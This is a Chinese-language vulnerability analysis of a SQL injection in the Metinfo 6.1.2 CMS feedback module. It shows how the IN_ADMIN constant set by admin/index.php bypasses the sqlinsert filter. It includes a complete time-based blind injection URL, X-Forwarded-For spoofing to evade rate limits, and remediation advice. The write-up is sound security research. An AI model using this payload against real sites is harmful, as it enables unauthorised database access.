---
title: Metinfo 6.1.2 反馈模块 SQL 注入漏洞分析及 IN_ADMIN 常量绕过 sqlinsert 过滤器的利用技巧
description: 深度分析 Metinfo 6.1.2 CMS 反馈模块中因 $_M[form][id] 参数缺乏单引号保护导致的 SQL 注入漏洞，详细解析
  sqlinsert() 过滤函数的拦截逻辑，以及通过 admin/index.php 入口定义 IN_ADMIN 常量绕过过滤器的实战利用链构造。
category: program-analysis
tags:
- Metinfo
- SQL注入
- CMS漏洞
- 代码审计
- 过滤器绕过
- IN_ADMIN
- sqlinsert
- 反馈模块
- Web安全
- 漏洞分析
date: 2024-01-15
updated: '2026-11-15'
---

## 漏洞概述

**影响版本**：Metinfo 6.1.2  
**漏洞类型**：SQL 注入（盲注）  
**攻击向量**：反馈模块 `add()` 函数中 `id` 参数未加引号拼接进 SQL 查询  
**核心难点**：全局 `sqlinsert()` 过滤器拦截 SQL 关键字、引号、注释符等  
**突破关键**：利用 `admin/index.php` 入口预定义 `IN_ADMIN` 常量，使 `daddslashes()` 跳过 `sqlinsert()` 调用  

## 代码审计溯源

### 注入触发点

文件：`\app\system\feedback\web\feedback.class.php`  
函数：`add($info)` 第 75 行起

```php
public function add($info) {
    global $_M;
    $query="select * from {$_M[table][config]} where name ='met_fd_ok' and columnid='{$_M[form][id]}' and lang='{$_M[form][lang]}'";
    // ... 省略中间逻辑 ...
    $met_fd_type=DB::get_one("select * from {$_M[table][config]} where lang ='{$_M[form][lang]}' and  name= 'met_fd_type' and columnid = {$_M[form][id]}");
}
```

**关键观察**：最后一行 SQL 中 `columnid = {$_M[form][id]}` **缺少单引号包裹**，MySQL 弱类型特性导致数值型注入成为可能。

### 继承链与过滤器初始化

```
feedback  extends web
web       extends common
common::__construct() → load_form() → daddslashes() → sqlinsert()
```

`common` 类构造函数调用 `load_form()`，进而对所有 `$_GET/$_POST/$_COOKIE` 递归调用 `daddslashes()`。

### sqlinsert() 过滤逻辑

```php
function sqlinsert($string) {
    // 替换敏感字符为 "/"
    $string = str_ireplace("\\", "/", $string);
    $string = str_ireplace('"', "/", $string);
    $string = str_ireplace("'", "/", $string);
    $string = str_ireplace("*", "/", $string);
    // URL 编码对应字符
    $string = str_ireplace("%5C", "/", $string);
    $string = str_ireplace("%22", "/", $string);
    $string = str_ireplace("%27", "/", $string);
    $string = str_ireplace("%2A", "/", $string);
    $string = str_ireplace("~", "/", $string);
    // 关键字插入反斜杠破坏语法
    $string = str_ireplace("select", "\\sel\\ect", $string);
    $string = str_ireplace("union", "\\un\\ion", $string);
    $string = str_ireplace("insert", "\\ins\\ert", $string);
    $string = str_ireplace("update", "\\up\\date", $string);
    $string = str_ireplace("delete", "\\de\\lete", $string);
    $string = str_ireplace("into", "\\in\\to", $string);
    $string = str_ireplace("load_file", "\\load\\_\\file", $string);
    $string = str_ireplace("outfile", "\\out\\file", $string);
    $string = str_ireplace("sleep", "\\sle\\ep", $string);
    $string = strip_tags($string);
    // 一旦发生替换，直接清空字符串
    if ($string_old != $string) { $string = ''; }
    return trim($string);
}
```

**过滤器特性**：  
- 采用「检测到恶意特征即清空」策略，极难直接绕过  
- 覆盖字符、URL 编码、SQL 关键字、危险函数  

## 过滤器绕过：IN_ADMIN 常量机制

### daddslashes() 判断逻辑

```php
function daddslashes($string, $force = 0) {
    !defined('MAGIC_QUOTES_GPC') && define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc());
    if (!MAGIC_QUOTES_GPC || $force) {
        if (is_array($string)) {
            foreach ($string as $key => $val) {
                $string[$key] = daddslashes($val, $force);
            }
        } else {
            if (!defined('IN_ADMIN')) {
                $string = trim(addslashes(sqlinsert($string)));  // 走过滤器
            } else {
                $string = trim(addslashes($string));              // 仅 addslashes，跳过 sqlinsert
            }
        }
    }
    return $string;
}
```

**关键分支**：`defined('IN_ADMIN')` 为真时，**完全跳过 `sqlinsert()`**，仅执行 `addslashes()`。

### IN_ADMIN 定义入口

文件：`admin/index.php` 第一行

```php
<?php
define('IN_ADMIN', true);
// ... 路由分发逻辑 ...
require_once '../app/system/entrance.php';
```

通过访问后台入口文件，自动定义 `IN_ADMIN`，后续路由分发可调用任意模块/类/方法。

## 实战利用链构造

### 路由参数映射

```
admin/index.php?m=web&n=feedback&c=feedback&a=dofeedback
→ 模块 m=web
→ 模型 n=feedback
→ 控制器 c=feedback
→ 动作 a=dofeedback
```

### 完整 Payload

```
http://target/admin/index.php?m=web&n=feedback&c=feedback&a=dofeedback
    &action=add
    &lang=cn
    &id=44%20and%20sleep(5)
    &para141=%E5%95%86%E5%8A%A1%E5%90%88%E4%BD%9C
```

**参数说明**：
- `action=add` → 触发 `feedback::add()`  
- `id=44 and sleep(5)` → 数值型盲注 Payload（无需引号、注释）  
- `para141` → 动态表单字段，值为 URL 编码后的中文「商务合作」，满足业务逻辑校验  

### 限制条件与绕过

| 限制 | 成因 | 绕过方案 |
|------|------|----------|
| IP 120 秒仅允许提交一次 | `checktime()` 基于 `$_SERVER['REMOTE_ADDR']` | 伪造 `X-Forwarded-For` 头轮换 IP |
| 验证码校验在注入点**之前** | `$_M[config][met_memberlogin_code]` 开启时拦截 | 仅适用于后台关闭验证码场景；开启时需人工/自动识别验证码，盲注效率极低 |

> **对比**：另一处无条件注入点位于验证码校验**之后**，可无视验证码直接自动化利用。本漏洞因业务逻辑顺序限制，实战价值略低。

## 关联技术体系

- [[sqlmap-comprehensive-guide]]：可结合 `--batch --time-sec=5` 自动化盲注验证  
- [[mysql-duplicate-entry-error-based-sqli]]：若数据库版本支持，可尝试报错注入提升效率  
- [[ctfshow-web-sql-injection-bypass-basics]]：数值型注入、宽字节、二阶注入等绕过技巧对比参考  
- [[xd-security-pentest-basic-stage-notes]]：渗透测试基础阶段 SQL 注入模块系统性总结  
- [[xd-security-waf-bypass-techniques-day46-49]]：WAF/过滤器绕过通用策略（编码、大小写、注释变形等）  
- [[php-file-inclusion-vulnerability]]：PHP 常见漏洞类型对比，理解框架级过滤器的局限性  

## 修复建议

1. **参数化查询**：所有 SQL 拼接点改用预处理语句（`PDO::prepare` / `mysqli_prepare`）  
2. **强制类型转换**：`$id = intval($_M['form']['id']);` 确保数值型参数安全  
3. **最小权限原则**：数据库账号仅授予必要权限，禁止 `FILE`、`PROCESS` 等高危权限  
4. **过滤器前置**：在框架入口统一实施参数校验，避免依赖业务层 `IN_ADMIN` 等条件分支  
5. **日志审计**：记录所有 `sleep()`/`benchmark()` 等延时函数调用的 SQL 语句，配合 WAF 实时阻断  

## 时间线

- **漏洞发现**：文章发布前（作者称「本来不想放出来」）  
- **公开披露**：微信公众号文章发布日期（需结合原文元数据确认）  
- **同类漏洞**：另一处无条件注入点已被他人公开，促使作者同步披露  

## 总结

本漏洞展示了 **框架级全局过滤器** 与 **业务入口常量标记** 交互产生的逻辑缺陷：  
- `sqlinsert()` 虽严格，但 `daddslashes()` 通过 `IN_ADMIN` 白名单机制留出「后门」  
- 后台入口 `admin/index.php` 无需权限即可触发常量定义，形成完整攻击链  
- 业务逻辑顺序（验证码前置）进一步限制了自动化利用可行性  

审计启示：**全局过滤器不可作为唯一防线**，需结合参数化查询、类型约束、最小权限等纵深防御措施。

## 来源

- [226安全团队-201805-202103_35](../sources/226安全团队-201805-202103_35.md)
